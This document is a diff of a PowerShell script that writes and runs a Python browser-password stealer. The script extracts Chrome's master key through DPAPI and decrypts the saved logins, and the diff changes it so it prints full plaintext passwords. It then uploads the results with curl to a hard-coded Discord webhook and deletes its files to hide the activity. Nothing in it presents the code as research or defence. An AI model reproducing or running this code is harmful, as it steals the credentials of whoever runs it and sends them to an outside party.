@@ -17,9 +17,7 @@ try:
         local_state = json.load(f)
     
     encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-    print(f"Encrypted key length: {len(encrypted_key)} bytes")
-    
-    encrypted_key = encrypted_key[5:]  # Remove "DPAPI" prefix
+    encrypted_key = encrypted_key[5:]
     key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
     print(f"✓ Key extracted: {len(key)} bytes")
 except Exception as e:
@@ -39,7 +37,7 @@ except Exception as e:
     exit()
 
 # 3. Tester le déchiffrement
-print("\n[3] Testing decryption...")
+print("\n[3] Testing decryption on 5 passwords...")
 try:
     conn = sqlite3.connect(temp_db, timeout=30)
     cur = conn.cursor()
@@ -51,51 +49,37 @@ try:
     for url, user, enc_pwd in cur.fetchall():
         try:
             if not enc_pwd or len(enc_pwd) < 15:
-                print(f"  ✗ {url[:50]} - Empty or too short")
+                print(f"✗ {url[:50]} - Empty")
                 failed += 1
                 continue
             
-            # Check format
-            prefix = enc_pwd[0:3]
-            print(f"  Password prefix: {prefix}")
+            nonce = enc_pwd[3:15]
+            ciphertext = enc_pwd[15:-16]
+            tag = enc_pwd[-16:]
             
-            if prefix == b'v10':
-                nonce = enc_pwd[3:15]
-                ciphertext = enc_pwd[15:-16]
-                tag = enc_pwd[-16:]
-                
-                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-                pwd = cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', 'ignore')
-                
-                print(f"  ✓ {url[:50]}")
-                print(f"    User: {user}")
-                print(f"    Pass: {pwd[:20]}...")
-                success += 1
-            else:
-                print(f"  ✗ {url[:50]} - Unknown format (prefix: {prefix})")
-                failed += 1
+            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+            pwd = cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', 'ignore')
+            
+            print(f"✓ {url}")
+            print(f"  User: {user}")
+            print(f"  Pass: {pwd}")
+            success += 1
                 
         except Exception as e:
-            print(f"  ✗ {url[:50]} - Error: {str(e)[:50]}")
+            print(f"✗ {url[:50]} - Error: {e}")
             failed += 1
     
     conn.close()
-    print(f"\n✓ Success: {success}")
-    print(f"✗ Failed: {failed}")
+    print(f"\nSuccess: {success} / Failed: {failed}")
     
 except Exception as e:
     print(f"✗ Database error: {e}")
 finally:
     if os.path.exists(temp_db):
         os.remove(temp_db)
-
-print("\n=== TEST COMPLETE ===")
 '@ | Out-File "decrypt_test.py" -Encoding UTF8
 
 $result = .\python.exe decrypt_test.py 2>&1 | Out-String
-
 $result | Out-File "decrypt_result.txt"
-
 curl.exe -F "file=@decrypt_result.txt" "https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"
-
 Remove-Item decrypt_test.py,decrypt_result.txt -Force -EA 0
